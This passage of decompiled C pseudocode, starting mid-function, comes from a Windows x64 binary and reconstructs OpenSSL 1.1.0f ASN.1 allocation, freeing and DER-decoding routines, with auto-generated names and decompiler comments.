      {
        v3();
        return;
      }
    }
    else if ( *(_BYTE *)a2 != 5 && *(_DWORD *)(a2 + 4) == 1 )
    {
      *a1 = *(_DWORD *)(a2 + 32);
      return;
    }
  }
  *(_QWORD *)a1 = 0i64;
}

//----- (0000000140050F80) ----------------------------------------------------
__int64 __fastcall sub_140050F80(_DWORD **a1, __int64 a2, int a3)
{
  __int64 result; // rax
  __int64 v7; // rax
  void (*v8)(void); // r8
  __int64 (*v9)(void); // r8
  unsigned int v10; // esi
  int v11; // eax
  _DWORD *v12; // rcx

  if ( !a2 )
    return 0i64;
  v7 = *(_QWORD *)(a2 + 24);
  if ( v7 )
  {
    if ( a3 )
    {
      v8 = *(void (**)(void))(v7 + 32);
      if ( v8 )
      {
        v8();
        return 1i64;
      }
    }
    else
    {
      v9 = *(__int64 (**)(void))(v7 + 16);
      if ( v9 )
        return v9();
    }
  }
  v10 = 0;
  if ( *(_BYTE *)a2 == 5 )
  {
    v11 = -1;
LABEL_15:
    if ( a3 )
    {
      v12 = *a1;
      *(_QWORD *)v12 = 0i64;
      *((_QWORD *)v12 + 1) = 0i64;
      *((_QWORD *)v12 + 2) = 0i64;
      v12[1] = v11;
      v12[4] = 128;
    }
    else
    {
      v12 = sub_140047720(v11);
      *a1 = v12;
    }
    if ( *(_BYTE *)a2 == 5 )
    {
      if ( v12 )
        v12[4] |= 0x40u;
    }
    goto LABEL_26;
  }
  v11 = *(_DWORD *)(a2 + 4);
  if ( v11 != -4 )
  {
    switch ( v11 )
    {
      case 1:
        *(_DWORD *)a1 = *(_DWORD *)(a2 + 32);
        return 1i64;
      case 5:
        result = 1i64;
        *a1 = (_DWORD *)1;
        return result;
      case 6:
        *a1 = sub_14002C0F0(0);
        return 1i64;
    }
    goto LABEL_15;
  }
  result = (__int64)sub_14001D8E0(0x10ui64);
  if ( !result )
    return result;
  *(_QWORD *)(result + 8) = 0i64;
  *(_DWORD *)result = -1;
  *a1 = (_DWORD *)result;
LABEL_26:
  LOBYTE(v10) = *a1 != 0i64;
  return v10;
}

//----- (0000000140051110) ----------------------------------------------------
__int64 __fastcall sub_140051110(__int64 *a1, int *a2)
{
  __int64 v4; // rax
  int v5; // ecx
  __int64 *v6; // rdi
  __int64 v7; // r8
  unsigned int v8; // r9d
  char *v10; // rax
  _QWORD *v11; // rax
  __int64 v12; // [rsp+48h] [rbp+10h] BYREF

  v4 = (*((__int64 (**)(void))a2 + 3))();
  v5 = *a2;
  v6 = &v12;
  v7 = v12;
  v8 = *a2 & 0x1000;
  if ( v8 )
    v7 = (__int64)a1;
  v12 = v7;
  if ( !v8 )
    v6 = a1;
  if ( (v5 & 1) == 0 )
  {
    if ( (v5 & 0x300) != 0 )
    {
      v11 = 0i64;
    }
    else
    {
      if ( (v5 & 6) == 0 )
        return sub_140050C80(v6, v4, v8);
      v11 = sub_1400296C0();
      if ( !v11 )
      {
        sub_140024610(13, 133, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_new.c", 226);
        return 0i64;
      }
    }
    *v6 = (__int64)v11;
    return 1i64;
  }
  if ( (v5 & 0x306) != 0 )
  {
    *v6 = 0i64;
  }
  else
  {
    v10 = (char *)(*((__int64 (**)(void))a2 + 3))();
    sub_140050BB0(v6, v10);
  }
  return 1i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140050C80: using guessed type __int64 __fastcall sub_140050C80(_QWORD, _QWORD, _QWORD);

//----- (0000000140051230) ----------------------------------------------------
void __fastcall sub_140051230(unsigned int **a1, __int64 a2)
{
  sub_140051280(a1, a2, 0);
}

//----- (0000000140051250) ----------------------------------------------------
void __fastcall sub_140051250(unsigned int *a1, __int64 a2)
{
  unsigned int *v2; // [rsp+30h] [rbp+8h] BYREF

  v2 = a1;
  sub_140051280(&v2, a2, 0);
}

//----- (0000000140051280) ----------------------------------------------------
void __fastcall sub_140051280(unsigned int **a1, __int64 a2, int a3)
{
  __int64 v5; // rdx
  void (__fastcall *v7)(__int64, unsigned int **, __int64); // rbp
  int *v8; // rdx
  int v9; // eax
  int *v10; // rbx
  unsigned int **v11; // rax
  void (__fastcall *v12)(unsigned int **, __int64, unsigned __int64); // rax
  int v13; // ebx
  __int64 i; // r14
  int *v15; // rax
  int *v16; // r15
  unsigned int **v17; // rax

  if ( a1 )
  {
    v5 = *(_QWORD *)(a2 + 24);
    if ( !*(_BYTE *)a2 || *a1 )
    {
      if ( !v5 || (v7 = *(void (__fastcall **)(__int64, unsigned int **, __int64))(v5 + 24)) == 0i64 )
        v7 = 0i64;
      switch ( *(_BYTE *)a2 )
      {
        case 0:
          v8 = *(int **)(a2 + 8);
          if ( !v8 )
            goto LABEL_10;
          sub_140051600(a1, v8);
          break;
        case 1:
        case 6:
          if ( !(unsigned int)sub_140081F50(a1, -1, a2)
            && (!v7
             || ((unsigned int (__fastcall *)(__int64, unsigned int **, __int64, _QWORD))v7)(2i64, a1, a2, 0i64) != 2) )
          {
            sub_140082030((__int64 *)a1, a2);
            v13 = 0;
            for ( i = *(_QWORD *)(a2 + 8) + 32i64 * *(int *)(a2 + 16); v13 < *(_DWORD *)(a2 + 16); ++v13 )
            {
              i -= 32i64;
              v15 = sub_140081E40(a1, i, 0);
              v16 = v15;
              if ( v15 )
              {
                v17 = (unsigned int **)sub_140082260(a1, (__int64)v15);
                sub_140051600(v17, v16);
              }
            }
            if ( v7 )
              v7(3i64, a1, a2);
            if ( !a3 )
              goto LABEL_33;
          }
          break;
        case 2:
          if ( !v7 || ((unsigned int (__fastcall *)(__int64, unsigned int **, __int64))v7)(2i64, a1, a2) != 2 )
          {
            v9 = sub_140082250(a1, a2);
            if ( v9 >= 0 && v9 < *(_DWORD *)(a2 + 16) )
            {
              v10 = (int *)(*(_QWORD *)(a2 + 8) + 32i64 * v9);
              v11 = (unsigned int **)sub_140082260(a1, (__int64)v10);
              sub_140051600(v11, v10);
            }
            if ( v7 )
              v7(3i64, a1, a2);
            if ( !a3 )
            {
LABEL_33:
              sub_14001D930(*a1);
              *a1 = 0i64;
            }
          }
          break;
        case 4:
          if ( v5 )
          {
            v12 = *(void (__fastcall **)(unsigned int **, __int64, unsigned __int64))(v5 + 16);
            if ( v12 )
              v12(a1, a2, 0x140000000ui64);
          }
          break;
        case 5:
LABEL_10:
          sub_1400514E0((__int64 *)a1, a2, a3);
          break;
        default:
          return;
      }
    }
  }
}

//----- (00000001400514E0) ----------------------------------------------------
void __fastcall sub_1400514E0(__int64 *a1, __int64 a2, int a3)
{
  void **v4; // rbx
  __int64 v5; // rax
  void (*v6)(void); // r9
  void (*v7)(void); // r8
  int v8; // ecx
  _DWORD *v9; // rax

  v4 = (void **)a1;
  if ( !a2 )
  {
    v9 = (_DWORD *)*a1;
    v8 = *(_DWORD *)*a1;
    v4 = (void **)(v9 + 2);
LABEL_15:
    if ( !*v4 )
      return;
    goto LABEL_16;
  }
  v5 = *(_QWORD *)(a2 + 24);
  if ( a3 )
  {
    if ( v5 )
    {
      v6 = *(void (**)(void))(v5 + 32);
      if ( v6 )
      {
        v6();
        return;
      }
    }
  }
  else if ( v5 )
  {
    v7 = *(void (**)(void))(v5 + 24);
    if ( v7 )
    {
      v7();
      return;
    }
  }
  if ( *(_BYTE *)a2 == 5 )
  {
    if ( *a1 )
    {
      sub_140047B00(*a1, a3);
      *v4 = 0i64;
    }
    return;
  }
  v8 = *(_DWORD *)(a2 + 4);
  if ( v8 != 1 )
    goto LABEL_15;
LABEL_16:
  switch ( v8 )
  {
    case -4:
      sub_1400514E0(v4, 0i64, 0i64);
      sub_14001D930(*v4);
      goto LABEL_27;
    case 1:
      if ( a2 )
        *(_DWORD *)v4 = *(_DWORD *)(a2 + 32);
      else
        *(_DWORD *)v4 = -1;
      return;
    case 5:
LABEL_27:
      *v4 = 0i64;
      return;
    case 6:
      sub_14003F4D0((__int64)*v4);
      break;
    default:
      sub_140047B00((__int64)*v4, a3);
      break;
  }
  *v4 = 0i64;
}

//----- (0000000140051600) ----------------------------------------------------
void __fastcall sub_140051600(unsigned int **a1, int *a2)
{
  int v2; // r8d
  unsigned int **v3; // r14
  __int64 v4; // rax
  unsigned int v5; // esi
  int v7; // ebx
  unsigned int *i; // rdi
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // [rsp+48h] [rbp+10h] BYREF
  __int64 v12; // [rsp+50h] [rbp+18h] BYREF

  v2 = *a2;
  v3 = (unsigned int **)&v11;
  v4 = v11;
  v5 = *a2 & 0x1000;
  if ( v5 )
    v4 = (__int64)a1;
  v11 = v4;
  if ( !v5 )
    v3 = a1;
  if ( (v2 & 6) != 0 )
  {
    v7 = 0;
    for ( i = *v3; v7 < (int)sub_1400296E0(i); ++v7 )
    {
      v12 = sub_140029880((__int64)i, v7);
      v9 = (*((__int64 (**)(void))a2 + 3))();
      sub_140051280(&v12, v9, v5);
    }
    sub_1400294B0((void **)i);
    *v3 = 0i64;
  }
  else
  {
    v10 = (*((__int64 (**)(void))a2 + 3))();
    sub_140051280(v3, v10, v5);
  }
}
// 140051280: using guessed type __int64 __fastcall sub_140051280(_QWORD, _QWORD, _QWORD);

//----- (00000001400516D0) ----------------------------------------------------
__int64 __fastcall sub_1400516D0(__int64 *a1, char **a2, __int64 a3, __int64 a4)
{
  __int64 *v5; // rbx
  __int64 v7; // [rsp+40h] [rbp-48h] BYREF
  char v8[24]; // [rsp+48h] [rbp-40h] BYREF

  v5 = &v7;
  v7 = 0i64;
  if ( a1 )
    v5 = a1;
  v8[0] = 0;
  if ( (int)sub_1400525F0(v5, a2, a3, a4, 0xFFFFFFFF, 0, 0, (__int64)v8) > 0 )
    return *v5;
  sub_140051230((unsigned int **)v5, a4);
  return 0i64;
}
// 1400516D0: using guessed type char var_40[24];

//----- (0000000140051760) ----------------------------------------------------
__int64 __fastcall sub_140051760(
        __int64 *a1,
        char **a2,
        __int64 a3,
        __int64 a4,
        unsigned int a5,
        int a6,
        char a7,
        __int64 a8)
{
  __int64 result; // rax
  unsigned int v11; // ebx

  result = sub_1400525F0(a1, a2, a3, a4, a5, a6, a7, a8);
  v11 = result;
  if ( (int)result <= 0 )
  {
    sub_140051230((unsigned int **)a1, a4);
    return v11;
  }
  return result;
}

//----- (00000001400517D0) ----------------------------------------------------
__int64 __fastcall sub_1400517D0(unsigned int a1)
{
  if ( a1 > 0x1E )
    return 0i64;
  else
    return (unsigned int)dword_1400F83F0[a1];
}
// 1400F83F0: using guessed type int dword_1400F83F0[32];

//----- (00000001400517F0) ----------------------------------------------------
__int64 __fastcall sub_1400517F0(
        int *a1,
        int *a2,
        _BYTE *a3,
        _BYTE *a4,
        _BYTE *a5,
        _BYTE **a6,
        int a7,
        int a8,
        int a9,
        char a10,
        __int64 a11)
{
  _QWORD *v11; // r12
  __int64 v13; // rbx
  int v15; // esi
  _BYTE *v18; // r10
  int v19; // r13d
  int v20; // ecx
  _BYTE *v21; // r10
  int v22; // r8d
  int v23; // r9d
  int v24; // edx
  __int64 result; // rax
  int v26; // eax
  int v27; // [rsp+30h] [rbp-38h] BYREF
  _BYTE *v28; // [rsp+38h] [rbp-30h] BYREF

  v11 = a6;
  v13 = a11;
  v15 = a7;
  v18 = *a6;
  v28 = v18;
  v19 = (int)v18;
  if ( a11 && *(_BYTE *)a11 )
  {
    v20 = *(_DWORD *)(a11 + 8);
    v21 = &v18[*(int *)(a11 + 20)];
    v22 = *(_DWORD *)(a11 + 16);
    v23 = *(_DWORD *)(a11 + 12);
    v24 = *(_DWORD *)(a11 + 4);
    v28 = v21;
    LODWORD(a6) = v20;
    LODWORD(a11) = v22;
    v27 = v23;
  }
  else
  {
    v26 = sub_140047780(&v28, (int *)&a6, &v27, (int *)&a11, a7);
    v20 = (int)a6;
    LOBYTE(v24) = v26;
    v22 = a11;
    v23 = v27;
    v21 = v28;
    if ( v13 )
    {
      *(_DWORD *)(v13 + 4) = v26;
      *(_DWORD *)(v13 + 8) = v20;
      *(_DWORD *)(v13 + 16) = v22;
      *(_DWORD *)(v13 + 12) = v23;
      *(_DWORD *)(v13 + 20) = (_DWORD)v21 - v19;
      *(_BYTE *)v13 = 1;
      if ( (v26 & 0x81) == 0 && v20 + (int)v21 - v19 > v15 )
      {
        sub_140024610(13, 104, 155, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1092);
        result = 0i64;
        *(_BYTE *)v13 = 0;
        return result;
      }
    }
  }
  if ( (v24 & 0x80u) != 0 )
  {
    sub_140024610(13, 104, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1100);
    if ( v13 )
      *(_BYTE *)v13 = 0;
    return 0i64;
  }
  if ( a8 < 0 )
    goto LABEL_17;
  if ( a8 == v23 && a9 == v22 )
  {
    if ( v13 )
      *(_BYTE *)v13 = 0;
LABEL_17:
    if ( (v24 & 1) != 0 )
      v20 = v15 + v19 - (_DWORD)v21;
    if ( a4 )
      *a4 = v24 & 1;
    if ( a5 )
      *a5 = v24 & 0x20;
    if ( a1 )
      *a1 = v20;
    if ( a3 )
      *a3 = v22;
    if ( a2 )
      *a2 = v23;
    *v11 = v21;
    return 1i64;
  }
  if ( a10 )
    return 0xFFFFFFFFi64;
  if ( v13 )
    *(_BYTE *)v13 = 0;
  sub_140024610(13, 104, 168, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1112);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140051A20) ----------------------------------------------------
__int64 __fastcall sub_140051A20(__int64 a1, void **a2, int a3, char a4, int a5, int a6, int a7)
{
  _BYTE *v7; // r10
  char v8; // r9
  int v9; // edi
  int *v10; // rbp
  int v12; // esi
  int v13; // ebx
  char v14; // al
  int v15; // edx
  int v16; // ebx
  int v17; // r9d
  __int64 v18; // rbp
  __int64 v19; // rcx
  int v20; // [rsp+44h] [rbp-34h] BYREF
  int v21; // [rsp+48h] [rbp-30h] BYREF
  int v22; // [rsp+4Ch] [rbp-2Ch] BYREF
  void *Src; // [rsp+50h] [rbp-28h] BYREF
  _BYTE *v24; // [rsp+58h] [rbp-20h] BYREF
  void **v26; // [rsp+88h] [rbp+10h]
  char v27; // [rsp+98h] [rbp+20h]

  v26 = a2;
  v7 = *a2;
  v8 = a4 & 1;
  v9 = a3;
  v10 = (int *)a1;
  Src = *a2;
  v27 = v8;
  if ( !a1 && !v8 )
  {
    *a2 = &v7[a3];
    return 1i64;
  }
  if ( a3 > 0 )
  {
    while ( 1 )
    {
      v12 = (int)v7;
      if ( v9 >= 2 && !*v7 && !v7[1] )
        break;
      v24 = v7;
      v13 = (int)v7;
      v14 = sub_140047780(&v24, &v20, &v21, &v22, v9);
      if ( v14 < 0 )
      {
        sub_140024610(13, 104, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1100);
        goto LABEL_36;
      }
      if ( a5 < 0 )
      {
        v15 = a6;
      }
      else if ( a5 != v21 || (v15 = a6, a6 != v22) )
      {
        sub_140024610(13, 104, 168, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1112);
LABEL_36:
        sub_140024610(13, 106, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 999);
        return 0i64;
      }
      v7 = v24;
      if ( (v14 & 1) != 0 )
      {
        v16 = v9 + v13 - (_DWORD)v24;
        v20 = v16;
      }
      else
      {
        v16 = v20;
      }
      v17 = (unsigned __int8)v14;
      Src = v24;
      if ( (v14 & 0x20) != 0 )
      {
        if ( a7 >= 5 )
        {
          sub_140024610(13, 106, 197, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1006);
          return 0i64;
        }
        LOBYTE(v17) = v14 & 1;
        if ( !(unsigned int)sub_140051A20((_DWORD)v10, (unsigned int)&Src, v16, v17, a5, v15, a7 + 1) )
          return 0i64;
        v7 = Src;
      }
      else if ( v16 )
      {
        if ( v10 )
        {
          v18 = *v10;
          if ( !sub_140082440(a1, v16 + (int)v18) )
          {
            sub_140024610(13, 140, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1029);
            return 0i64;
          }
          v19 = v18;
          v10 = (int *)a1;
          memmove((void *)(*(_QWORD *)(a1 + 8) + v19), Src, v16);
          v7 = Src;
        }
        v7 += v16;
        Src = v7;
      }
      v9 += v12 - (_DWORD)v7;
      if ( v9 <= 0 )
      {
        v8 = v27;
        a2 = v26;
        goto LABEL_28;
      }
    }
    v7 += 2;
    Src = v7;
    if ( !v27 )
    {
      sub_140024610(13, 106, 159, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 990);
      return 0i64;
    }
    a2 = v26;
    goto LABEL_38;
  }
LABEL_28:
  if ( !v8 )
  {
LABEL_38:
    *a2 = v7;
    return 1i64;
  }
  sub_140024610(13, 106, 137, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1016);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140051D00) ----------------------------------------------------
__int64 __fastcall sub_140051D00(
        __int64 *a1,
        char **a2,
        int a3,
        __int64 a4,
        unsigned int a5,
        int a6,
        char a7,
        __int64 a8)
{
  int v8; // eax
  unsigned int v9; // r14d
  unsigned int v13; // edi
  int v14; // r15d
  char *v15; // rsi
  int v16; // ecx
  int v17; // edx
  __int64 v18; // rax
  int v19; // eax
  int v20; // r8d
  int v21; // eax
  int v22; // eax
  int v23; // ecx
  int v24; // eax
  int v25; // eax
  int v26; // eax
  __int64 v27; // rbx
  char *v28; // rsi
  char *v29; // r15
  int v30; // [rsp+20h] [rbp-79h]
  char v31; // [rsp+60h] [rbp-39h] BYREF
  char v32; // [rsp+61h] [rbp-38h] BYREF
  char v33[2]; // [rsp+62h] [rbp-37h] BYREF
  int v34; // [rsp+64h] [rbp-35h] BYREF
  char *v35; // [rsp+68h] [rbp-31h] BYREF
  unsigned int v36; // [rsp+70h] [rbp-29h] BYREF
  char *v37; // [rsp+78h] [rbp-21h] BYREF
  __int64 v38; // [rsp+80h] [rbp-19h] BYREF
  char *v39; // [rsp+88h] [rbp-11h]
  __int64 v40; // [rsp+90h] [rbp-9h]
  int v41; // [rsp+98h] [rbp-1h]
  int v43; // [rsp+F0h] [rbp+57h]

  v43 = a3;
  v9 = 0;
  v31 = 0;
  v38 = 0i64;
  v39 = 0i64;
  v40 = 0i64;
  v41 = 0;
  if ( !a1 )
  {
    sub_140024610(v8 - 171, v8 - 76, v8 - 59, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 635);
    return 0i64;
  }
  if ( *(_BYTE *)a4 == 5 )
  {
    v13 = a5;
    v14 = -1;
  }
  else
  {
    v13 = *(_DWORD *)(a4 + 4);
    v14 = a5;
  }
  if ( v13 == -4 )
  {
    if ( v14 >= 0 )
    {
      sub_140024610(13, 108, 127, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 649);
      return 0i64;
    }
    if ( a7 )
    {
      sub_140024610(13, 108, 126, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 654);
      return 0i64;
    }
    v15 = *a2;
    v37 = *a2;
    if ( a8 && *(_BYTE *)a8 )
    {
      v16 = *(_DWORD *)(a8 + 16);
      v13 = *(_DWORD *)(a8 + 12);
      v17 = *(_DWORD *)(a8 + 4);
      LODWORD(v35) = *(_DWORD *)(a8 + 8);
      v18 = *(int *)(a8 + 20);
      v34 = v16;
      v37 = &v15[v18];
      v36 = v13;
    }
    else
    {
      v19 = sub_140047780(&v37, (int *)&v35, (int *)&v36, &v34, a3);
      v16 = v34;
      LOBYTE(v17) = v19;
      v13 = v36;
      if ( !a8 )
        goto LABEL_18;
      v20 = (int)v35;
      *(_DWORD *)(a8 + 4) = v19;
      v21 = (_DWORD)v37 - (_DWORD)v15;
      *(_DWORD *)(a8 + 8) = v20;
      *(_DWORD *)(a8 + 16) = v16;
      *(_DWORD *)(a8 + 12) = v13;
      *(_DWORD *)(a8 + 20) = v21;
      *(_BYTE *)a8 = 1;
      if ( (v17 & 0x81) != 0 )
      {
LABEL_18:
        a3 = v43;
      }
      else
      {
        v22 = v20 + v21;
        a3 = v43;
        if ( v22 > v43 )
        {
          sub_140024610(13, 104, 155, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1092);
          *(_BYTE *)a8 = 0;
          v30 = 661;
LABEL_31:
          sub_140024610(13, 108, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", v30);
          return 0i64;
        }
      }
    }
    if ( (v17 & 0x80u) != 0 )
    {
      sub_140024610(13, 104, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1100);
      if ( a8 )
        *(_BYTE *)a8 = 0;
      v30 = 661;
      goto LABEL_31;
    }
    if ( (_BYTE)v16 )
      v13 = -3;
  }
  v23 = v14;
  if ( v14 == -1 )
    v23 = v13;
  v35 = *a2;
  v24 = 0;
  if ( v14 != -1 )
    v24 = a6;
  v25 = sub_1400517F0(&v34, 0i64, 0i64, v33, &v32, &v35, a3, v23, v24, a7, a8);
  if ( !v25 )
  {
    v30 = 676;
    goto LABEL_31;
  }
  if ( v25 == -1 )
    return 0xFFFFFFFFi64;
  if ( v13 - 16 <= 1 )
  {
    if ( v13 != -3 )
    {
      if ( !v32 )
      {
        sub_140024610(13, 108, 156, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 694);
        return 0i64;
      }
LABEL_49:
      v29 = *a2;
      if ( v33[0] )
      {
        if ( !(unsigned int)sub_140052490(&v35, v34, v33[0]) )
          goto LABEL_57;
        v28 = v35;
        LODWORD(v27) = (_DWORD)v35 - (_DWORD)v29;
      }
      else
      {
        LODWORD(v27) = v34 + (_DWORD)v35 - (_DWORD)v29;
        v28 = &v35[v34];
      }
LABEL_55:
      if ( (unsigned int)sub_140052150(a1, v29, v27, v13, &v31, a4) )
      {
        *a2 = v28;
        v9 = 1;
      }
      goto LABEL_57;
    }
LABEL_47:
    if ( a8 )
      *(_BYTE *)a8 = 0;
    goto LABEL_49;
  }
  if ( v13 == -3 )
    goto LABEL_47;
  if ( !v32 )
  {
    LODWORD(v27) = v34;
    v29 = v35;
    v28 = &v35[v34];
    goto LABEL_55;
  }
  if ( v13 <= 0xA )
  {
    v26 = 1126;
    if ( _bittest(&v26, v13) )
    {
      sub_140024610(13, 108, 195, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 712);
      return 0i64;
    }
  }
  v31 = 1;
  if ( !(unsigned int)sub_140051A20((__int64)&v38, (void **)&v35, v34, v33[0], -1, 0, 0) )
    goto LABEL_57;
  v27 = (int)v38;
  if ( sub_140082440((__int64)&v38, (int)v38 + 1) )
  {
    v28 = v35;
    v39[v27] = 0;
    v29 = v39;
    goto LABEL_55;
  }
  sub_140024610(13, 108, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 730);
LABEL_57:
  if ( v31 )
    sub_14001D930(v39);
  return v9;
}
// 140051D50: variable 'v8' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140051D00: using guessed type char var_6E[2];

//----- (0000000140052150) ----------------------------------------------------
__int64 __fastcall sub_140052150(__int64 *a1, char *a2, int a3, int a4, _BYTE *a5, __int64 a6)
{
  unsigned int v6; // r15d
  __int64 *v9; // rbx
  __int64 *v10; // r13
  __int64 v11; // rdi
  __int64 v12; // r10
  __int64 (__fastcall *v13)(__int64 *, char *); // r10
  __int64 v15; // rax
  void *v16; // rax
  __int64 v17; // rsi
  _DWORD *v18; // rax
  _BYTE *v19; // r12
  char *v20; // [rsp+68h] [rbp+10h] BYREF

  v20 = a2;
  v6 = 0;
  v9 = a1;
  v10 = 0i64;
  v11 = 0i64;
  v12 = *(_QWORD *)(a6 + 24);
  if ( v12 )
  {
    v13 = *(__int64 (__fastcall **)(__int64 *, char *))(v12 + 40);
    if ( v13 )
      return v13(a1, a2);
  }
  if ( *(_DWORD *)(a6 + 4) != -4 )
    goto LABEL_11;
  v11 = *a1;
  if ( *a1 )
  {
LABEL_8:
    if ( a4 != *(_DWORD *)v11 )
    {
      sub_14003F350(v11, a4, 0i64);
      a2 = v20;
    }
    v10 = v9;
    v9 = (__int64 *)(v11 + 8);
LABEL_11:
    switch ( a4 )
    {
      case 1:
        if ( a3 != 1 )
        {
          sub_140024610(13, 204, 106, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 800);
          goto LABEL_43;
        }
        *(_DWORD *)v9 = (unsigned __int8)*a2;
        goto LABEL_14;
      case 2:
      case 10:
        if ( !sub_14007DF60(v9, &v20, a3) )
          goto LABEL_43;
        *(_DWORD *)(*v9 + 4) = a4 | *(_DWORD *)(*v9 + 4) & 0x100;
        goto LABEL_14;
      case 3:
        v16 = sub_1400828C0(v9, &v20, a3);
        goto LABEL_13;
      case 5:
        if ( a3 )
        {
          sub_140024610(13, 204, 144, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 792);
          goto LABEL_43;
        }
        *v9 = 1i64;
        goto LABEL_14;
      case 6:
        v16 = sub_14003FA20(v9, &v20, a3);
LABEL_13:
        if ( v16 )
          goto LABEL_14;
        goto LABEL_43;
      default:
        if ( a4 == 30 )
        {
          if ( (a3 & 1) != 0 )
          {
            sub_140024610(13, 204, 214, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 842);
            goto LABEL_43;
          }
        }
        else if ( a4 == 28 && (a3 & 3) != 0 )
        {
          sub_140024610(13, 204, 215, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 847);
          goto LABEL_43;
        }
        v17 = *v9;
        if ( *v9 )
        {
          *(_DWORD *)(v17 + 4) = a4;
        }
        else
        {
          v18 = sub_140047720(a4);
          v17 = (__int64)v18;
          if ( !v18 )
          {
            sub_140024610(13, 204, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 854);
            goto LABEL_43;
          }
          *v9 = (__int64)v18;
        }
        v19 = a5;
        if ( *a5 )
        {
          sub_14001D930(*(void **)(v17 + 8));
          *(_QWORD *)(v17 + 8) = v20;
          *(_DWORD *)v17 = a3;
          *v19 = 0;
        }
        else if ( !(unsigned int)sub_1400475D0(v17, v20, a3) )
        {
          sub_140024610(13, 204, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 870);
          sub_140047500(v17);
          *v9 = 0i64;
          goto LABEL_43;
        }
LABEL_14:
        if ( v11 && a4 == 5 )
          *(_QWORD *)(v11 + 8) = 0i64;
        v6 = 1;
        break;
    }
    return v6;
  }
  v15 = sub_14004FF40();
  v11 = v15;
  if ( v15 )
  {
    a2 = v20;
    *v9 = v15;
    goto LABEL_8;
  }
LABEL_43:
  sub_14004FF20((unsigned int *)v11);
  if ( v10 )
    *v10 = 0i64;
  return v6;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140052490) ----------------------------------------------------
__int64 __fastcall sub_140052490(_BYTE **a1, int a2, char a3)
{
  _BYTE *v3; // rbx
  int v5; // edi
  int v7; // esi
  int v8; // ebp
  char v9; // al
  int v10; // edx
  int v11; // [rsp+30h] [rbp-38h] BYREF
  _BYTE *v12; // [rsp+38h] [rbp-30h] BYREF
  int v13; // [rsp+70h] [rbp+8h] BYREF
  int v14; // [rsp+88h] [rbp+20h] BYREF

  v3 = *a1;
  v5 = a2;
  if ( a3 )
  {
    v7 = 1;
    if ( a2 > 0 )
    {
      while ( 1 )
      {
        if ( v5 < 2 || *v3 || v3[1] )
        {
          v12 = v3;
          v8 = (int)v3;
          v9 = sub_140047780(&v12, &v13, &v11, &v14, v5);
          if ( v9 < 0 )
          {
            sub_140024610(13, 104, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 1100);
            sub_140024610(13, 190, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 928);
            return 0i64;
          }
          if ( (v9 & 1) != 0 )
          {
            v10 = v5 + (_DWORD)v3 - (_DWORD)v12;
            v13 = v10;
          }
          else
          {
            v10 = v13;
          }
          v3 = v12;
          if ( (v9 & 1) != 0 )
          {
            if ( v7 == -1 )
            {
              sub_140024610(13, 190, 58, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 933);
              return 0i64;
            }
            ++v7;
          }
          else
          {
            v3 = &v12[v10];
          }
          v5 += v8 - (_DWORD)v3;
        }
        else
        {
          v3 += 2;
          if ( !--v7 )
            goto LABEL_20;
          v5 -= 2;
        }
        if ( v5 <= 0 )
        {
          if ( v7 )
            break;
LABEL_20:
          *a1 = v3;
          return 1i64;
        }
      }
    }
    sub_140024610(13, 190, 137, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\tasn_dec.c", 943);
    return 0i64;
  }
  else
  {
    *a1 = &v3[a2];
    return 1i64;
  }
}
